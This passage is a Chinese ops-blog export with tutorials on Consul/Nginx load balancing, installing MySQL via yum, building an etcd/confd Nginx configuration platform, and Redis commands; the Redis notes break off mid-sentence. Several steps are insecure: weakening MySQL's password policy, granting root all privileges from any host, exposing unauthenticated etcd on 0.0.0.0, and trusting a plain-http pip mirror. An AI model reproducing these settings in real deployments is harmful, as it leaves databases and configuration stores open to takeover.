以相同的方式在其余两台主机上重复以上操作，再次访问 http://IP:8500 查看 Consul Server 的节点信息和服务注册列表。 Consul 集群节点信息，包括两台 Consul Server 节点和一台 Consul Client 节点，节点右侧可以看到所有的服务注册列表和相关的健康检查结果： nginx 服务状态列表，服务名称 nginx-consul-template，提供 http 服务，共有2个服务实例： test-client 服务状态列表，服务名称为 my-web-server，提供 http 服务，共有3个服务实例： test-server 服务状态列表，服务名称为 test-server-http-service 和 test-server-thrift-service，分别对应6个 http 服务实例和 6个 thrift 服务实例： 三台 Consul Client 主机上的容器服务实例均正常启动，服务注册和发现运行正常！ 结果验证Nginx负载均衡访问NginxNginx 默认访问端口号为80，任选一台 Nginx 访问，比如： http://192.168.1.181/swagger-ui.html。 请求转发至 Test Client 的 Swagger页面，表明 nginx配置文件 nginx.conf 被 Consul-template 成功修改。 进入Nginx容器运行 docker ps 查看 nginx-consul-template 的容器 ID，比如这里是：4f2731a7e0cb。进入 nginx-consul-template 容器。 1docker-enter 4f2731a7e0cb 查看容器内部的进程列表： 特别留意以下一行进程命令，这里完成了三步重要的操作： 1consul-template -consul-addr=consul:8500 -template /etc/consul-templates/nginx.conf.ctmpl:/etc/nginx/conf.d/app.conf:nginx -s reload Consul-template 利用 Consul 上的服务信息对 Nginx 的配置文件模板 /etc/consul-templates/nginx.conf.ctmpl 进行重新解析和渲染。 渲染生成的 nginx 配置文件为 /etc/nginx/conf.d/app.conf。 进一步运行 nginx -s reload 重新加载 app.conf，更新路由转发列表。 查看 app.conf 的配置项，发现三个 test-client 节点的 IP:port 都加入了路由转发列表中。 退出并关闭主机 192.168.1.182 上的 test-client 容器。 再次查看 app.conf，可以发现路由节点 192.168.1.182:80 已经从 Nginx 的路由转发列表上剔除掉了。 同样的，重新启动 test-client 恢复容器，又可以发现 Nginx 的路由转发列表 再次自动将其添加! 服务负载均衡接口测试test-client 通过 http 通信方式请求任意一台 test-server，返回响应结果 (请求处理时间 ms )。 test-client 通过 thrift 通信方式请求任意一台 test-server，返回响应结果 (请求处理时间 ms )。 日志分析服务的负载均衡并不是很好观察，这里直接截取了一段 test-client 的服务缓存列表动态定时刷新时打印的日志： 123456789101112131415161718192021222018-02-09 13:15:55.157 INFO 1 --- [erListUpdater-1] t.c.l.ThriftConsulServerListLoadBalancer : Refreshed thrift serverList: [test-server-thrift-service: [ ThriftServerNode&#123;node='consul_client_01', serviceId='test-server-thrift-service', tags=[test-server-thrift-service-01], host='192.168.1.182', port=30000, address='192.168.1.182', isHealth=true&#125;, ThriftServerNode&#123;node='consul_client_01', serviceId='test-server-thrift-service', tags=[test-server-thrift-service-02], host='192.168.1.182', port=32000, address='192.168.1.182', isHealth=true&#125;, ThriftServerNode&#123;node='consul_client_02', serviceId='test-server-thrift-service', tags=[test-server-thrift-service-03], host='192.168.1.183', port=30000, address='192.168.1.183', isHealth=true&#125;, ThriftServerNode&#123;node='consul_client_02', serviceId='test-server-thrift-service', tags=[test-server-thrift-service-04], host='192.168.1.183', port=32000, address='192.168.1.183', isHealth=true&#125;, ThriftServerNode&#123;node='consul_client_03', serviceId='test-server-thrift-service', tags=[test-server-thrift-service-05], host='192.168.1.185', port=30000, address='192.168.1.185', isHealth=true&#125;, ThriftServerNode&#123;node='consul_client_03', serviceId='test-server-thrift-service', tags=[test-server-thrift-service-06], host='192.168.1.185', port=32000, address='192.168.1.185', isHealth=true&#125;],test-server-http-service: [ ThriftServerNode&#123;node='consul_client_01', serviceId='test-server-http-service', tags=[test-server-http-service-01], host='192.168.1.182', port=16000, address='192.168.1.182', isHealth=true&#125;, ThriftServerNode&#123;node='consul_client_01', serviceId='test-server-http-service', tags=[test-server-http-service-02], host='192.168.1.182', port=18000, address='192.168.1.182', isHealth=true&#125;, ThriftServerNode&#123;node='consul_client_02', serviceId='test-server-http-service', tags=[test-server-http-service-03], host='192.168.1.183', port=16000, address='192.168.1.183', isHealth=true&#125;, ThriftServerNode&#123;node='consul_client_02', serviceId='test-server-http-service', tags=[test-server-http-service-04], host='192.168.1.183', port=18000, address='192.168.1.183', isHealth=true&#125;, ThriftServerNode&#123;node='consul_client_03', serviceId='test-server-http-service', tags=[test-server-http-service-05], host='192.168.1.185', port=16000, address='192.168.1.185', isHealth=true&#125;, ThriftServerNode&#123;node='consul_client_03', serviceId='test-server-http-service', tags=[test-server-http-service-06], host='192.168.1.185', port=18000, address='192.168.1.185', isHealth=true&#125;],my-web-server: [ ThriftServerNode&#123;node='consul_client_01', serviceId='my-web-server', tags=[test-client-http-service-01], host='192.168.1.182', port=80, address='192.168.1.182', isHealth=true&#125;, ThriftServerNode&#123;node='consul_client_02', serviceId='my-web-server', tags=[test-client-http-service-02], host='192.168.1.183', port=80, address='192.168.1.183', isHealth=true&#125;, ThriftServerNode&#123;node='consul_client_03', serviceId='my-web-server', tags=[test-client-http-service-03], host='192.168.1.185', port=80, address='192.168.1.185', isHealth=true&#125;]] 服务实例 test-server-http-service 所有健康的服务实例： 服务IP地址 服务端口 服务标签 192.168.1.182 16000 test-server-http-service-01 192.168.1.182 18000 test-server-http-service-02 192.168.1.183 16000 test-server-http-service-03 192.168.1.183 18000 test-server-http-service-04 192.168.1.185 16000 test-server-http-service-05 192.168.1.185 18000 test-server-http-service-06 test-server-thrift-service 所有健康的服务实例： 服务IP地址 服务端口 服务标签 192.168.1.182 30000 test-server-thrift-service-01 192.168.1.182 32000 test-server-thrift-service-02 192.168.1.183 30000 test-server-thrift-service-03 192.168.1.183 32000 test-server-thrift-service-04 192.168.1.185 30000 test-server-thrift-service-05 192.168.1.185 32000 test-server-thrift-service-06 my-web-server 所有健康的服务实例： 服务IP地址 服务端口 服务标签 192.168.1.182 80 test-client-http-service-01 192.168.1.183 80 test-client-http-service-02 192.168.1.185 80 test-client-http-service-03 spring-cloud-starter-thrift 采用的轮询的转发策略，也就是说 my-web-server 会按次序循环往来地将 http 或者 rpc 请求分发到各自的 6 个服务实例完成处理。 总结本文提供了一套基于微服务服务注册与发现体系和容器的高可用 (HA) 解决方案，引入了接入层和服务层的自动负载均衡的实现，详细给出了实践方案和技术手段]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql之yum安装]]></title>
    <url>%2Farticles%2Fdb063ff7.html</url>
    <content type="text"><![CDATA[目的在CentOS7中默认安装有MariaDB，这个是MySQL的分支，但为了需要，还是要在系统中安装MySQL，而且安装完成之后可以直接覆盖掉MariaDB，本文yum一键安装mysql数据库。 安装下载官方的Yum源1`[root@BrianZhu /]``# wget -i -c http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm` 使用上面的命令就直接下载了安装用的Yum Repository，大概25KB的样子。 安装Yum源1`[root@BrianZhu /]``# yum -y install mysql57-community-release-el7-10.noarch.rpm` 安装MySQL1`[root@BrianZhu /]``# yum -y install mysql-community-server` 这步可能会花些时间，安装完成后就会覆盖掉之前的mariadb。 出现这样的提示表示安装成功 数据库设置启动1`[root@BrianZhu /]``# systemctl start mysqld.service` 查看运行状态1`[root@BrianZhu /]``# systemctl status mysqld.service` 此时MySQL已经开始正常运行，不过要想进入MySQL还得先找出此时root用户的密码，通过如下命令可以在日志文件中找出密码： 1`[root@BrianZhu /]``# grep "password" /var/log/mysqld.log` 上面标记的就是初始密码 如下命令进入数据库： 1`[root@BrianZhu /]``# mysql -uroot -p # 回车后会提示输入密码` 输入初始密码，此时不能做任何事情，因为MySQL默认必须修改密码之后才能操作数据库： 1`mysql&gt; ``ALTER` `USER` `'root'``@``'localhost'` `IDENTIFIED ``BY` `'new password'``;` 这里有个问题，新密码设置的时候如果设置的过于简单会报错： 原因是因为MySQL有密码设置的规范，具体是与validate_password_policy的值有关： MySQL完整的初始密码规则可以通过如下命令查看： 1`mysql&gt; SHOW VARIABLES ``LIKE` `'validate_password%'``;``+``--------------------------------------+-------+``| Variable_name | Value |``+``--------------------------------------+-------+``| validate_password_check_user_name | ``OFF` `|``| validate_password_dictionary_file | |``| validate_password_length | 4 |``| validate_password_mixed_case_count | 1 |``| validate_password_number_count | 1 |``| validate_password_policy | LOW |``| validate_password_special_char_count | 1 |``+``--------------------------------------+-------+``rows` `in` `set` `(0.01 sec)` 密码的长度是由validate_password_length决定的，而validate_password_length的计算公式是： 1`validate_password_length = validate_password_number_count + validate_password_special_char_count + (2 * validate_password_mixed_case_count)` 解决方法就是修改密码为规范复杂的密码： 1`mysql&gt; ``ALTER` `USER` `'root'``@``'localhost'` `IDENTIFIED ``BY` `'z?guwrBhH7p&gt;'``;``Query OK, 0 ``rows` `affected (0.00 sec)` `mysql&gt;` 这时候我们要把密码规则改一下，执行下面sql就可以了： 1`mysql&gt; ``set` `global` `validate_password_policy=0;``Query OK, 0 ``rows` `affected (0.00 sec)` `mysql&gt; ``set` `global` `validate_password_length=1;``Query OK, 0 ``rows` `affected (0.00 sec)` `mysql&gt;` 设置之后就是我上面查出来的那几个值了，此时密码就可以设置的很简单，例如1234之类的。到此数据库的密码设置就完成了。 但此时还有一个问题，就是因为安装了Yum Repository，以后每次yum操作都会自动更新，需要把这个卸载掉： 1`[root@BrianZhu ~]``# yum -y remove mysql57-community-release-el7-10.noarch` 配置算是完成了 可视化工具的登录授权：注意：如果授权不成功，请查看防火墙 操作完成上面的，现在还不能用可视化的客户端进行连接，需要我们进行授权： 1`grant` `all` `on` `*.* ``to` `root@``'%'` `identified ``by` `'数据库密码'``;` 大功告成！！！]]></content>
      <categories>
        <category>数据库运维</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx配置管理平台]]></title>
    <url>%2Farticles%2Fa5026eaa.html</url>
    <content type="text"><![CDATA[目的熟悉nginx的配置不难发现，nginx是一个典型的key value类型的，而且与文件系统的非常类似，一个目录下面可以包含其他配置，目录下还可以有目录，嵌套多层。如今key value类型的数据库非常多，redis、leveldb等，最近新秀etcd也是key-value分布式数据库，提供类似文件系统操作，使用raft协议保持数据一致性，非常适合云计算分布式部署场景，将confd与etcd搭配，非常适合nginx这样的配置格式。本文就详细讲解了nginx配置管理平台的实现。 环境12345CentOS 7.x x64Python: 2.7.6Etcd： 3.2.18Confd: 0.16.0Nginx: 1.12.1 拓扑图简易拓扑 配置平台详情拓扑 涉及软件123456etcd：分布式KV存储系统，一般用于共享配置和服务注册与发现。是CoreOS公司发起的一个开源项目。 ETCD存储格式类似于文件系统，以根"/"开始下面一级级目录，最后一个是Key，一个key对应一个Value。etcd集群：使用Raft协议保证每个节点数据一致，由多个节点对外提供服务。这里只用单台。confd：管理本地应用配置文件，使用etcd或consul存储的数据渲染模板，还支持redis、zookeeper等。confd有一个watch功能，通过HTTP API定期监测对应的etcd中目录变化，获取最新的Value，然后渲染模板Nginx: Nginx是一款轻量级的Web服务器/反向代理服务器以及电子邮件代理服务器，并在一个BSD-like协议下发行。由俄罗斯的程序设计师lgor Sysoev所开发，供俄国大型的入口网站及搜索引擎Rambler使用。其特点是占有内存少，并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好。 软件部署安装etcd注意：这里安装的单机,集群环境根据自己的需求选取 123yum install etcd -ysed -i 's/localhost/0.0.0.0/g' /etc/etcd/etcd.conf #配置监听地址systemctl start etcd &amp;&amp; systemctl enable etcd #启动服务设置开机动 安装nginx123456789101112131415161718192021222324252627282930313233343536373839# 安装依赖包yum install python-devel gcc gcc-c++ pcre pcre-devel patch unzip zlib zlib-devel openssl openssl-devel git -y #依赖包# 下载nginx包cd /usr/local/srcwget http://nginx.org/download/nginx-1.12.1.tar.gzgit clone https://github.com/yaoweibin/nginx_upstream_check_module.git # 安装tar -zxvf nginx-1.12.1.tar.gz cd nginx-1.12.1patch -p1 &lt;/usr/local/src/nginx_upstream_check_module/check_1.12.1+.patch./configure --prefix=/usr/local/nginx --add-module=/usr/local/src/nginx_upstream_check_module/make -j4 &amp;&amp; make install# 修改配置mkdir /usr/local/nginx/conf/vhost/# Nginx http的配置文件修改为这个样子,增加include目录配置vim /usr/local/nginx/conf/nginx.conf http &#123; include mime.types; default_type application/octet-stream; #log_format main '$remote_addr - $remote_user [$time_local] "$request" ' # '$status $body_bytes_sent "$http_referer" ' # '"$http_user_agent" "$http_x_forwarded_for"'; #access_log logs/access.log main; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; include vhost/*.conf; &#125; 安装confd12345下载地址https://github.com/kelseyhightower/confd/releases下载完毕丢到系统里面cp confd /usr/bin/confd which confd#/usr/bin/confd 创建配置文件目录123mkdir -p /etc/confd/&#123;conf.d,templates&#125;# conf.d # 资源模板，下面文件必须以toml后缀# templates # 配置文件模板，下面文件必须以tmpl后缀 创建confd配置文件12345678910vim /etc/confd/conf.d/test.conf.toml[template]src = "test.conf.tmpl" #默认在/etc/confd/templates目录下dest = "/usr/local/nginx/conf/vhost/test.conf" #要更新的配置文件keys = ["/Shopping", #监测的key]check_cmd = "/usr/local/nginx/sbin/nginx -t" #配置文件测试reload_cmd ="/usr/local/nginx/sbin/nginx -s reload" #加载配置文件 创建confd模板1234567891011121314151617181920212223242526vi /etc/confd/templates/app01.conf.tmpl upstream &#123;&#123;getv "/Shopping/nginx/cluster1/proxy_name"&#125;&#125; &#123; &#123;&#123;range getvs "/Shopping/nginx/cluster1/upstream/*"&#125;&#125; server &#123;&#123;.&#125;&#125;; &#123;&#123;end&#125;&#125; check interval=5000 rise=1 fall=5 timeout=4000 type=http; check_http_send "HEAD / HTTP/1.0\r\n\r\n"; check_http_expect_alive http_2xx http_3xx; &#125; server &#123; server_name &#123;&#123;range getvs "/Shopping/nginx/cluster1/server_name/*"&#125;&#125; &#123;&#123;.&#125;&#125; &#123;&#123;end&#125;&#125;; location / &#123; proxy_pass http://&#123;&#123;getv "/Shopping/nginx/cluster1/proxy_name"&#125;&#125;; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; location /status &#123; check_status; access_log off; &#125; &#125; 在Ectd中写入变量1234etcdctl set /Shopping/nginx/cluster1/proxy_name test.cometcdctl set /Shopping/nginx/cluster1/server_name/servername shopping.cometcdctl set /Shopping/nginx/cluster1/upstream/serverA 192.168.1.2:8080etcdctl set /Shopping/nginx/cluster1/upstream/serverB 192.168.1.3:8080 启动confd并设置开机启动12# 需要更改etcd 的连接地址即可nohup confd -watch -backend etcd -node http://localhost:2379 &amp; 验证confd启动后会自动生成配置文件，如图： 配置平台部署配置Python环境 12345678yum install python-pip -y #安装pipmkdir /root/.pip/ #创建pip源配置文件目录vim /root/.pip/pip.conf #修改为阿里云的pip源 [global] trusted-host=mirrors.aliyun.com index-url=http://mirrors.aliyun.com/pypi/simple/ [list] format=columns 创建虚拟环境1234567pip install virtualenv #安装沙盒工具virtualenv env #建议创建一个沙盒环境跑该平台source env/bin/activate #使用沙盒环境git clone https://github.com/1032231418/Conf_Web.gitcd Conf_Web/ospweb/pip install -r requirement.txt #安装相关软件 创建数据库并将表刷入数据库123456789101112131415161718mysql -p #登录数据库为平台创建一个数据库CREATE DATABASE opsweb CHARACTER SET utf8 COLLATE utf8_general_ci; #创建数据库vi opsweb/settings.py #这里数据库信息改为自己的数据库信息 DATABASES = &#123; 'default': &#123; 'ENGINE': 'django.db.backends.mysql', 'NAME': 'opsweb', 'HOST': 'localhost', 'USER': 'root', 'PASSWORD': '123456', 'PORT': 3306, &#125; &#125; ETCD_Server = "192.168.0.221" #这里改为自己etcd 的ip地址 ETCD_Port = 2379 python manage.py migrate #提交迁移文件至数据库,将表刷入数据库 创建超级管理员账号1python manage.py createsuperuser 运行平台12python manage.py runserver 0:8000# 访问地址就是 http://ip:8000 账号密码就是上一步创建的超级管理员账号密码 登录平台为nginx创建key/value以Shopping 平台为例 项目创建: 1.创建商城项目 /Shopping 2.创建商城项目里面的 /Shopping/nginx nginx 服务 3.创建nginx 集群目录 /Shopping/nginx/cluster1 4.给我们的商城nginx集群1项目创建配置文件 5.域名 和 节点名称可能是多个，这里我们需要创建目录 /Shopping/nginx/cluster1/server_name 和 /Shopping/nginx/cluster1/upstream 1234配置创建:1.反向代理 /Shopping/nginx/cluster1/proxy_name 2.绑定一个域名 /Shopping/nginx/cluster1/server_name/1 3.创建一个集群节点 /Shopping/nginx/cluster1/upstream/web1 1etcd 里面存储的值 1生成的配置文件 1通过hosts 文件我们可以查看节点状态(虽然这个节点不是up 状态但是由此可见,我们可以动态添加节点) nginx + uwsgi + django项目部署uwsgi 部署12345678910111213141516171819202122232425262728source env/bin/activate #使用沙盒pip install uwsgi #安装 uwsgivim uwsgi.ini [uwsgi]# 配置服务器的监听ip和端口，让uWSGI作为nginx的支持服务器的话，设置socke就行；如果要让uWSGI作为单独的web-server，用httphttp = 127.0.0.1:8000#socket = 127.0.0.1:3309# 配置项目目录（此处设置为项目的根目录）chdir = /home/web/opsweb# 配置入口模块 (django的入口函数的模块，即setting同级目录下的wsgi.py)wsgi-file = opsweb/wsgi.py# 开启master, 将会多开一个管理进程, 管理其他服务进程master = True# 服务器开启的进程数量processes = 8# 以守护进程方式提供服, 输出信息将会打印到log中daemonize = wsgi.log# 服务器进程开启的线程数量threads = 4# 退出的时候清空环境变量vacuum = true# 进程pidpidfile = uwsgi.pid# 配uWSGI搜索静态文件目录（及django项目下我们存放static文件的目录，用uWSGI作为单独服务器时才需要设置，此时我们是用nginx处理静态文件）# check-static = /home/web/opsweb/static//home/env/bin/uwsgi --ini uwsgi.ini #启动服务 nginx 配置12345678910111213141516171819202122vim /usr/local/nginx/conf/vhost/ops.conf upstream ops_web &#123; server 127.0.0.1:8000; &#125; server &#123; server_name ops.xxx.com; #改为你平台的域名 location / &#123; proxy_pass http://ops_web; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; location /static &#123; alias /home/web/opsweb/static/; &#125; &#125; /usr/local/nginx/sbin/nginx -s reload #重新加载配置文件]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis系列之数据类型和操作]]></title>
    <url>%2Farticles%2Fdfc587ba.html</url>
    <content type="text"><![CDATA[目的Redis是一种支持Key-Value等多种数据结构的存储系统。可用于缓存，事件发布或订阅，高速队列等场景。该数据库使用ANSI C语言编写，支持网络，提供字符串，哈希，列表，队列，集合结构直接存取，基于内存，可持久化。本文介绍Redis的数据类型和相关操作。 支持的语言 Redis的应用场景1，会话缓存（最常用） 2，消息队列，比如支付 3，活动排行榜或计数 4，发布，订阅消息（消息通知） 5，商品列表，评论列表等 数据类型以及相关操作Redis一共支持五种数据类：string（字符串），hash（哈希），list（列表），set（集合）和zset（sorted set有序集合）,在3.2版本以后新添加geo经纬度支持，以下将对其类型的常用操作做说明。 命令使用前言通大多数据库一样，redis所有的命令提供了帮助，可以使用help +命令名称查看其使用方法，帮助信息中不仅有命令用法，还有命令始于版本信息，分组等。 为了友好的使用，redis还将所有命令都进行了分组,同时使用help+@+组名进行查看每个组中所有命令，以下是所有分组信息。 上面以及介绍如何查看命令使用方法，所以在以下数据类型操作时候，只举例常用的命令，更多命令参考https://redis.io/commands 注意：redis在3.2版本新增geo数据类型。 1234567891011121314generic #一般命令组，对大多数类型适用string #字符串类型命令组，使用所有字符串类型list #列表类型命令组set #集合类型命令组sorted_set #有序集合命令组hash #hash操作命令组pubsub #发布命令组transactions #事务操作命令组connection #连接相关命令组server #服务器相关命令组scripting #lua 脚本命令组hyperloglog #hyperloglog类型命令组，redis在 2.8.9 版本添加了 HyperLogLog 结构cluster #集群相关命令组geo #经纬度相关命令组，适用于3.2.0以后的版本 示例服务操作 1234567slect＃选择数据库（数据库编号0-15）退出＃退出连接信息＃获得服务的信息与统计monitor＃实时监控config get＃获得服务配置flushdb＃删除当前选择的数据库中的keyflushall＃删除所有数据库中的键 事务操作12345DEL key #删除某个keyKEYS pattern #查看符合正则的所有keyEXISTS key [key ...] #判断某个key是否存在，可支持多个，返回存在的个数EXPIRE key seconds #刷新某个key过期时间MOVE key db #移动key到某个数据库 string操作它是redis的最基本的数据类型，一个键对应一个值，需要注意是一个键值最大存储512MB，redis中的整型也当作字符串处理。 12345678910111213141516171819202122232425262728SET key value [EX seconds] [PX milliseconds] [NX|XX] #设置key为指定的字符串值。#参数：#EX seconds – 设置键key的过期时间，单位时秒#PX milliseconds – 设置键key的过期时间，单位时毫秒#NX – 只有键key不存在的时候才会设置key的值#XX – 只有键key存在的时候才会设置key的值APPEND key value #如果 key 已经存在，并且值为字符串，那么这个命令会把 value 追加到原来值（value）的结尾。 如果 key 不存在，那么它将首先创建一个空字符串的key，再执行追加操作，这种情况 APPEND 将类似于 SET 操作。GET key #获取key值，不存在则返回nilGETRANGE key start end #获取指定key值的索引开始位置和结束位置所对应的值，索引从0开始GETSET key value #设置新的key值，并获取设置之前的值，如果key不存在则设置，并返回nilMGET key [key ...] #批量获取key的值MSET key value [key value ...] #批量设置key的值DECR key #数字类型的key自减操作，key类型不是数字则报错INCR key #数字类型key 自加操作，与DECR相反DECRBY key decrement #数字类型key指定减少数值INCRBY key increment #数字类型key指定增加数值，与DECRBY相反STRLEN key #获取key长度 list操作列表中的元素索引从0开始，倒数的元素可以用“-”+倒数位置表示，如-2，代表倒数第二个元素，-1则代表最后一个元素。 Redis列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边。 一个列表最多可以包含 2 32 - 1 个元素 (4294967295, 每个列表超过40亿个元素)。 123456789101112131415161718192021222324252627282930LPUSH key value [value ...] #从列表左边放入一个或者多个元素LPUSHX key value #当列表存在时，从左边放入一个元素RPUSH key value [value ...] #从列表右边放入一个或者多个元素RPUSHX key value #当列表存在时，从右边放入一个元素LSET key index value #根据索引设置列表中元素的值,当list不存在是报错LINDEX key index #根据列表索引获取元素值，索引从0开始LINSERT key BEFORE|AFTER pivot value #在列表中，基于某个基准点插入值，pivot代表基准点LLEN key #获取列表长度LRANGE key start stop #根据索引获取列表中的元素，列表索引最后一个可以使用-1LREM key count value #从存于 key 的列表里移除前 count 次出现的值为 value 的元素#count &gt; 0: 从头往尾移除值为 value 的元素#count &lt; 0: 从尾往头移除值为 value 的元素#count = 0: 移除所有值为 value 的元素LPOP key #从列表左边删除一个元素RPOP key #从列表右边删除一个元素RPOPLPUSH source destination #删除source列表中的删除最后一个元素将其追加到destination列表LTRIM key start stop #根据索引start和stop保留列表元素 hash操作hash操作所有命令都以H开头。 Redis hash 是一个string类型的field和value的映射表，hash特别适合用于存储对象。 Redis 中每个 hash 可以存储 2 32 - 1 键值对（40多亿）。 1234567891011121314151617181920212223HDEL key field [field ...] #删除hash表中一个或多个字段HEXISTS key field #判断hash表中字段是否存在HGET key field #获取hash表中字段的值HGETALL key #获取hash表中所有字段HSET key field value # 设置hash表中字段的值HSETNX key field value #只有当字段不存在时候才设置hash表中字段值，HLEN key #获取hash表中字段个数HVALS key #获取hash表中所有字段的值HKEYS key #获取hash表中所有的字段HSTRLEN key field #获取hash表中指定字段的值的长度HMSET key field value [field value ...] #批量设置hash表中字段的值HMGET key field [field ...] #批量获取hash表中字段的值 集合set操作Redis 的 Set 是 String 类型的无序集合。集合成员是唯一的，这就意味着集合中不能出现重复的数据。 Redis 中集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是 O(1)。 集合中最大的成员数为 2 32 - 1 (4294967295, 每个集合可存储40多亿个成员)。 12345678910111213141516171819SADD key member [member ...] #添加一个或多个元素到集合中SREM key member [member ...] #删除一个或多个集合中的元素SCARD key #获取集合中元素数量SMEMBERS key #返回集合中所有的元素SINTER key [key ...] #获取两个或两个以上集合的交集SUNION key [key ...] #获取两个或两个以上集合的并集SDIFF key [key ...] #获取两个或者两个以上集合的差集SISMEMBER key member #判断元素是否是在指定集合中SMOVE source destination member #移动一个集合中的元素到另一个集合SPOP key [count] #移除count个集合中元素，count可选参数，默认为1，即移除一个 有序集合操作Redis 有序集合和集合一样也是string类型元素的集合,且不允许重复的成员。 不同的是每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。 有序集合的成员是唯一的,但分数(score)却可以重复。 集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是O(1)。 集合中最大的成员数为 2 32 - 1 (4294967295, 每个集合可存储40多亿个成员)。 1234567891011121314151617181920ZADD key [NX|XX] [CH] [INCR] score member [score member ...] #向一个有序集合添加成员（元素）#参数：#XX: 仅仅更新存在的成员，不添加新成员。#NX: 不更新存在的成员。只添加新成员。#CH: 修改返回值为发生变化的成员总数，原始是返回新添加成员的总数 (CH 是 changed 的意思)。更改的元素是新添加的成员，已经存在的成员更新分数。 所以在命令中指定的成员有相同的分数将不被计算在内。注：在通常情况下，ZADD返回值只计算新添加成员的数量。#INCR: 当ZADD指定这个选项时，成员的操作就等同ZINCRBY命令，对成员的分数进行递增操作。ZCARD key #获取有序集合中元素个数ZCOUNT key min max #指定分数范围的元素个数ZINCRBY key increment member #为有序集的元素的score值加上增加指定的incrementZRANGE key start stop [WITHSCORES] #根据有序集合中分数区间获取集合中的元素ZRANGE key start stop [WITHSCORES] #获取有序集合中元素的排名ZREM key member [member ...] #删除有序集合中一个或多个元素ZSCORE key member #设置元素在集合中的分数 GEO类型操作Redis的GEO是 3.2 版本的新特性，对GEO(地理位置)的支持。这个功能可以将用户给定的地理位置信息储存起来， 并对这些信息进行操作。 geo类型命令不多，总共6个所以这里全部列举出来了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344GEOADD key longitude latitude member [longitude latitude member ...] #将指定的地理空间位置（纬度、经度、名称）添加到指定的key中GEODIST key member1 member2 [unit] #返回两个给定位置之间的距离。如果两个位置之间的其中一个不存在， 那么命令返回空值。指定单位的参数 unit 必须是以下单位的其中一个：#m 表示单位为米#km 表示单位为千米#mi 表示单位为英里#ft 表示单位为英尺GEOPOS key member [member ...] #从key里返回所有给定位置元素的位置（经度和纬度）GEOHASH key member [member ...] #返回一个或多个位置元素的 Geohash 表示。通常使用表示位置的元素使用不同的技术，使用Geohash位置52点整数编码。由于编码和解码过程中所使用的初始最小和最大坐标不同，编码的编码也不同于标准。此命令返回一个标准的GeohashGEORADIUS key longitude latitude radius m|km|ft|mi [WITHCOORD] [WITHDIST] [WITHHASH] [COUNT count] [ASC|DESC] [STORE key] [STOREDIST key] #以给定的经纬度为中心， 返回键包含的位置元素当中， 与中心的距离不超过给定最大距离的所有位置元素。#范围可以使用以下其中一个单位：#m 表示单位为米。#km 表示单位为千米。#mi 表示单位为英里。#ft 表示单位为英尺。#在给定以下可选项时， 命令会返回额外的信息：#WITHDIST: 在返回位置元素的同时， 将位置元素与中心之间的距离也一并返回。 距离的单位和用户给定的范围单位保持一致。#WITHCOORD: 将位置元素的经度和维度也一并返回。#WITHHASH: 以 52 位有符号整数的形式， 返回位置元素经过原始 geohash 编码的有序集合分值。 这个选项主要用于底层应用或者调试， 实际中的作用并不大。#命令默认返回未排序的位置元素。 通过以下两个参数， 用户可以指定被返回位置元素的排序方式：#ASC: 根据中心的位置， 按照从近到远的方式返回位置元素。#DESC: 根据中心的位置， 按照从远到近的方式返回位置元素。#在默认情况下， GEORADIUS 命令会返回所有匹配的位置元素。 虽然用户可以使用 COUNT &lt;count&gt; 选项去获取前 N 个匹配元素， 但是因为命令在内部可能会需要对所有被匹配的元素进行处理， 所以在对一个非常大的区域进行搜索时， 即使只使用 COUNT 选项去获取少量元素， 命令的执行速度也可能会非常慢。 但是从另一方面来说， 使用 COUNT 选项去减少需要返回的元素数量， 对于减少带宽来说仍然是非常有用的。#返回值： #在没有给定任何 WITH 选项的情况下， 命令只会返回一个像 [“New York”,”Milan”,”Paris”] 这样的线性（linear）列表。 #在指定了 WITHCOORD 、 WITHDIST 、 WITHHASH 等选项的情况下， 命令返回一个二层嵌套数组， 内层的每个子数组就表示一个元素 #在返回嵌套数组时， 子数组的第一个元素总是位置元素的名字。 至于额外的信息， 则会作为子数组的后续元素， 按照以下顺序被返回： #以浮点数格式返回的中心与位置元素之间的距离， 单位与用户指定范围时的单位一致。 #geohash 整数。 #由两个元素组成的坐标，分别为经度和纬度。GEORADIUSBYMEMBER key member radius m|km|ft|mi [WITHCOORD] [WITHDIST] [WITHHASH] [COUNT count] [ASC|DESC] [STORE key] [STOREDIST key]#这个命令和 GEORADIUS 命令一样， 都可以找出位于指定范围内的元素， 但是 GEORADIUSBYMEMBER 的中心点是由给定的位置元素决定的。 Redis的发布与订阅Redis 发布订阅(pub/sub)是一种消息通信模式：发送者(pub)发送消息，订阅者(sub)接收消息。 Redis 客户端可以订阅任意数量的频道。 下图是三个客户端同时订阅同一个频道 下图是有新信息发送给频道1时，就会将消息发送给订阅它的三个客户端 运作原理每个 Redis 服务器进程都维持着一个表示服务器状态的 redis.h/redisServer 结构， 结构的 pubsub_channels 属性是一个字典， 这个字典就用于保存订阅频道的信息： 12345struct redisServer &#123; // ... dict *pubsub_channels; // ...&#125;; 其中，字典的键为正在被订阅的频道， 而字典的值则是一个链表， 链表中保存了所有订阅这个频道的客户端。 比如说，在下图展示的这个 pubsub_channels 示例中， client1 、 client2 和 client3 就订阅了 channel1 ， 而client3也同时订阅了channel2。 当客户端调用 SUBSCRIBE 命令时， 程序就将客户端和要订阅的频道在 pubsub_channels字典中关联起来。 SUBSCRIBE 命令的行为可以用伪代码表示如下： 1234567def SUBSCRIBE(client, channels): // 遍历所有输入频道 for channel in channels: // 将客户端添加到链表的末尾 redisServer.pubsub_channels[channel].append(client) 通过 pubsub_channels 